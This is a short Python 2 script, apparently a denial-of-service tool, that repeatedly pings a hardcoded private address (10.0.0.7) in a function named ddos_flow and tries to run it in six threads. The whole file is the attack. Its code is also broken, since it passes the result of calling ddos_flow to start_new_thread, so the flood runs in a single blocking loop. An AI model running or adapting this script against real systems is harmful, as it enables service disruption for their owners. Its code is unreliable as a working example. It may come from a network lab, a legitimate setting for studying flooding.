from subprocess import call
import sys
import time
from thread import start_new_thread


def ddos_flow():
	while True:
		# call(['ping','-c','1','-i','0.2',sys.argv[1]])
		call(['ping','-c','1','-i','0.2','10.0.0.7'])

start_new_thread(ddos_flow())
start_new_thread(ddos_flow())
start_new_thread(ddos_flow())
start_new_thread(ddos_flow())
start_new_thread(ddos_flow())
start_new_thread(ddos_flow())
